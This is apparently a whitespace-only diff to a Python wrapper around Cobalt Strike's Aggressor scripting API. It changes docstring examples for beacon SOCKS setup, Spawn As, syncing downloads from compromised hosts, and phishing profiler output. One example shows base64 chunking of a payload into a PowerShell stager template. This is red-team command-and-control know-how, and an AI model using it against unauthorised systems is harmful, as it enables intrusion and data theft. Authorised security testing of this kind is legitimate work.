+        openProcessBrowser($1);
     }
     """
 
@@ -3924,10 +3924,10 @@ def openSOCKSSetup(*args, fork=False):
     Example
     
     item "SOCKS Server" {
-    	local('$bid');
-    	foreach $bid ($1) {
-    		openSOCKSSetup($bid);
-    	}
+        local('$bid');
+        foreach $bid ($1) {
+            openSOCKSSetup($bid);
+        }
     }
     """
 
@@ -4010,10 +4010,10 @@ def openSpawnAsDialog(*args, fork=False):
     Example
     
     item "Spawn As..." {
-    	local('$bid');
-    	foreach $bid ($1) {
-    		openSpawnAsDialog($bid);
-    	}
+        local('$bid');
+        foreach $bid ($1) {
+            openSpawnAsDialog($bid);
+        }
     }
     """
 
@@ -4147,9 +4147,9 @@ def popup_clear(*args, fork=False):
     popup_clear("help");
     
     popup help {
-    	item "My stuff!" {
-    		show_message("This is my menu!");
-    	}
+        item "My stuff!" {
+            show_message("This is my menu!");
+        }
     }
     """
 
@@ -4272,7 +4272,7 @@ def previousTab(*args, fork=False):
     Example
     
     bind Ctrl+Left {
-    	previousTab();
+        previousTab();
     }
     """
 
@@ -4303,7 +4303,7 @@ def prompt_confirm(*args, fork=False):
     Example
     
     prompt_confirm("Do you feel lucky?", "Do you?", {
-    	show_mesage("Ok, I got nothing");
+        show_mesage("Ok, I got nothing");
     });
     """
 
@@ -4321,7 +4321,7 @@ def prompt_directory_open(*args, fork=False):
     Example
     
     prompt_directory_open("Choose a folder", $null, false, {
-    	show_message("You chose: $1");
+        show_message("You chose: $1");
     });
     """
 
@@ -4339,7 +4339,7 @@ def prompt_file_open(*args, fork=False):
     Example
     
     prompt_file_open("Choose a file", $null, false, {
-    	show_message("You chose: $1");
+        show_message("You chose: $1");
     });
     """
 
@@ -4355,10 +4355,10 @@ def prompt_file_save(*args, fork=False):
     Example
     
     prompt_file_save($null, {
-    	local('$handle');
-    	$handle = openf("> $+ $1");
-    	println($handle, "I am content");
-    	closef($handle);
+        local('$handle');
+        $handle = openf("> $+ $1");
+        println($handle, "I am content");
+        closef($handle);
     });
     """
 
@@ -4375,7 +4375,7 @@ def prompt_text(*args, fork=False):
     Example
     
     prompt_text("What is your name?", "Cyber Bob", {
-    	show_mesage("Hi $1 $+ , nice to meet you!");
+        show_mesage("Hi $1 $+ , nice to meet you!");
     });
     """
 
@@ -4421,7 +4421,7 @@ def removeTab(*args, fork=False):
     Example
     
     bind Ctrl+D {
-    	removeTab();
+        removeTab();
     }
     """
 
@@ -4499,9 +4499,9 @@ def separator(*args, fork=False):
     Example
     
     popup foo {
-    	item "Stuff" { ... }
-    	separator();
-    	item "Other Stuff" { ... }
+        item "Stuff" { ... }
+        separator();
+        item "Other Stuff" { ... }
     }
     """
 
@@ -4552,7 +4552,7 @@ def showVisualization(*args, fork=False):
     Example
     
     bind Ctrl+H {
-    	showVisualization("Hello World");
+        showVisualization("Hello World");
     }
     
     See Also
@@ -4677,13 +4677,13 @@ def ssh_command_register(*args, fork=False):
     Example
     
     ssh_alis echo {
-    	blog($1, "You typed: " . substr($1, 5));
+        blog($1, "You typed: " . substr($1, 5));
     }
     
     ssh_command_register(
-    	"echo",
-    	"echo posts to the current session's log",
-    	"Synopsis: echo [arguments]\n\nLog arguments to the SSH console");
+        "echo",
+        "echo posts to the current session's log",
+        "Synopsis: echo [arguments]\n\nLog arguments to the SSH console");
     """
 
     return engine.call('ssh_command_register', args, fork=fork)
@@ -4714,9 +4714,9 @@ def str_chunk(*args, fork=False):
     
     # hint... :)
     else if ($1 eq "template.x86.ps1") {
-    	local('$enc');
-    	$enc = str_chunk(base64_encode($2), 61);
-    	return strrep($data, '%%DATA%%', join("' + '", $enc));
+        local('$enc');
+        $enc = str_chunk(base64_encode($2), 61);
+        return strrep($data, '%%DATA%%', join("' + '", $enc));
     }
     """
 
@@ -4785,14 +4785,14 @@ def sync_download(*args, fork=False):
     
     # sync all downloads
     command ga {
-    	local('$download $lpath $name $count');
-    	foreach $count => $download (downloads()) {
-    		($lpath, $name) = values($download, @("lpath", "name"));
+        local('$download $lpath $name $count');
+        foreach $count => $download (downloads()) {
+            ($lpath, $name) = values($download, @("lpath", "name"));
     
-    		sync_download($lpath, script_resource("file $+ .$count"), lambda({
-    			println("Downloaded $1 [ $+ $name $+ ]");
-    		}, \$name));
-    	}
+            sync_download($lpath, script_resource("file $+ .$count"), lambda({
+                println("Downloaded $1 [ $+ $name $+ ]");
+            }, \$name));
+        }
     }
     """
 
@@ -4838,13 +4838,13 @@ def tokenToEmail(*args, fork=False):
     Example
     
     set PROFILER_HIT {
-    	local('$out $app $ver $email');
-    	$email = tokenToEmail($5);
-    	$out = "\c9[+]\o $1 $+ / $+ $2 [ $+ $email $+ ] Applications";
-    	foreach $app => $ver ($4) {
-    		$out .= "\n\t $+ $[25]app $ver";
-    	}
-    	return "$out $+ \n\n";
+        local('$out $app $ver $email');
+        $email = tokenToEmail($5);
+        $out = "\c9[+]\o $1 $+ / $+ $2 [ $+ $email $+ ] Applications";
+        foreach $app => $ver ($4) {
+            $out .= "\n\t $+ $[25]app $ver";
+        }
+        return "$out $+ \n\n";
     }
     """
 
@@ -4942,7 +4942,7 @@ def url_open(*args, fork=False):
     Example
     
     command go {
-    	url_open("https://www.cobaltstrike.com/");
+        url_open("https://www.cobaltstrike.com/");
     }
     """
 
@@ -4957,7 +4957,7 @@ def users(*args, fork=False):
     Example
     
     foreach $user (users()) {
-    	println($user);
+        println($user);
     }
     """
 
@@ -4983,10 +4983,10 @@ def vpn_interface_info(*args, fork=False):
     
     # create a script console alias to interface info
     command interface {
-    	println("Interface $1");
-    	foreach $key => $value (vpn_interface_info($1)) {
-    		println("$[15]key $value");
-    	}
+        println("Interface $1");
+        foreach $key => $value (vpn_interface_info($1)) {
+            println("$[15]key $value");
+        }
     }
     """
 
